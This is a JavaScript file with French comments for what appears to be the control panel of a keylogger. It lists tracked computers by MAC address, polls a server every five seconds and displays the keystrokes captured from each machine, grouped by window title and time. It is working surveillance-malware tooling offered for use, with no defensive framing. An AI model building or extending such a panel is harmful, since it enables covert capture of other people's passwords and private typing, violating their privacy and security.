let logData = []; // Stocke les frappes récupérées

document.addEventListener("DOMContentLoaded", function () {
    const computerSelect = document.getElementById("computer-list"); // Sélecteur des machines
    const logContent = document.getElementById("log-content"); // Contenu des logs affichés
    const mainMessage = document.getElementById("main-message"); // Message par défaut
    const recordingStatus = document.getElementById("recordingStatus"); // Indicateur d'enregistrement

    async function fetchComputers() {
        try {
            const response = await fetch('/api/get_users');
            const data = await response.json();
            computerSelect.innerHTML = '<option value="">Select a tracked computer</option>';

            data.forEach(mac => {
                const option = document.createElement('option');
                option.value = mac;
                option.textContent = mac;
                computerSelect.appendChild(option);
            });
        } catch (error) {
            console.error("Erreur lors de la récupération des machines :", error);
        }
    }

    async function fetchData() {
        const selectedMac = computerSelect.value;
        if (!selectedMac) return;

        try {
            const response = await fetch(`/api/get_data/${selectedMac}`);
            const data = await response.json();

            console.log("Données récupérées :", data);
            if (data.error) {
                logContent.innerHTML = `<p style="color: red;">${data.error}</p>`;
                return;
            }

            logData = data || [];
            displayContent(logData);
        } catch (error) {
            console.error("Erreur lors de la récupération des logs :", error);
        }
    }

    function displayContent(content) {
        // Vérifier si l'utilisateur est déjà en bas avant d'ajouter les nouvelles données
        const isScrolledToBottom = logContent.scrollHeight - logContent.clientHeight <= logContent.scrollTop + 10;

        logContent.innerHTML = "";

        let lastWindow = null;
        let lastTimestamp = null;

        content.forEach(entry => {
            const { window_mame, timestamp, data } = entry;

            const dateObj = new Date(timestamp);
            const dateFormatted = dateObj.toLocaleDateString(); // JJ/MM/AAAA
            const timeFormatted = dateObj.toLocaleTimeString(); // HH:MM:SS

            const fullTimestamp = `${dateFormatted} - ${timeFormatted}`;

            // Si la fenêtre a changé, on affiche un nouveau titre
            if (window_mame !== lastWindow) {
                const windowTitle = document.createElement("h3");
                windowTitle.textContent = window_mame;
                windowTitle.style.fontWeight = "bold";
                windowTitle.style.marginTop = "10px";
                windowTitle.style.marginBottom = "5px";
                logContent.appendChild(windowTitle);

                lastWindow = window_mame;
                lastTimestamp = dateObj;
                appendTimestamp(fullTimestamp);
            }

            // Afficher le timestamp toutes les 2 minutes si on reste dans la même fenêtre
            if (!lastTimestamp || (dateObj - lastTimestamp) >= 120000) {
                appendTimestamp(fullTimestamp);
                lastTimestamp = dateObj;
            }

            // Afficher le texte tapé
            const dataElement = document.createElement("p");
            dataElement.textContent = data;
            dataElement.style.marginBottom = "5px";
            logContent.appendChild(dataElement);
        });

        // Si l'utilisateur était en bas, on le redirige en bas après mise à jour
        if (isScrolledToBottom) {
            logContent.scrollTop = logContent.scrollHeight;
        }
    }

    function appendTimestamp(timestampText) {
        const timeElement = document.createElement("p");
        timeElement.innerHTML = `<strong>${timestampText}</strong>`;
        timeElement.style.fontSize = "11px";
        timeElement.style.fontWeight = "bold";
        timeElement.style.marginBottom = "5px";
        logContent.appendChild(timeElement);
    }

    function searchContent(query) {
        if (!query) return displayContent(logData);
        const filtered = logData.filter(entry => JSON.stringify(entry).includes(query));
        displayContent(filtered);
    }

    fetchComputers();
    setInterval(fetchData, 5000);

    computerSelect.addEventListener("change", function () {
        if (computerSelect.value) {
            mainMessage.style.display = "none";
            recordingStatus.style.display = "block";
            fetchData();
        }
    });
});
